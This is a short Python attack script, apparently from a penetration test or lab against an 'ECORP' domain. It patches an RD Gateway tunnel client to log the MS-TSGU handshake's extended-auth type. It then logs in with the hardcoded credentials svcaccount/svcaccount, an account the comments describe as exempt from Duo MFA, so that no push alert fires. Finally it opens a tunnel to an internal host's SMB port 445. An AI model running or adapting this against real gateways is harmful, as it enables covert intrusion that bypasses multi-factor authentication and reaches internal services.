#!/usr/bin/env python3
"""Log the gateway's HANDSHAKE_RESPONSE extendedAuth selector (MS-TSGU):
errorCode(4) verMajor(1) verMinor(1) serverVersion(2) extendedAuth(2).
Values: 0=none 1=SC 2=PAA 4=SSPI_NTLM 8=BEARER. Free probe — svcaccount
is Duo-exempt so tunnel-auth pushes nothing. Also dumps full response body.
"""
import sys
import rdetour
from rdetour import RDGTunnel

g = sys.argv[1] if len(sys.argv) > 1 else "ECORP-RDS.ecorp.local"
orig = RDGTunnel._handshake

def patched(self):
    self.send_packet(rdetour.pkt(0x1, b"\x01\x00" + rdetour.u16(0) + rdetour.u16(0)))
    ptype, body = self._expect_packet(0x2)
    err = int.from_bytes(body[0:4], "little")
    print("[handshake-response] raw=%s" % body.hex())
    print("  errorCode=0x%08x verMajor=%d verMinor=%d serverVersion=%d extendedAuth=%d"
          % (err, body[4], body[5],
             int.from_bytes(body[6:8], "little"),
             int.from_bytes(body[8:10], "little")))
    if err:
        raise rdetour.RDGProtocolError("handshake refused", err)

RDGTunnel._handshake = patched
t = RDGTunnel(gateway=g, domain="ECORP.local", user="svcaccount",
              password="svcaccount", verbose=True)
try:
    t.establish(auth_timeout=15)
    t.open_channel("192.168.15.40", 445)
    print("[+] full tunnel cycle OK (svcaccount exempt, no push)")
finally:
    t.close()
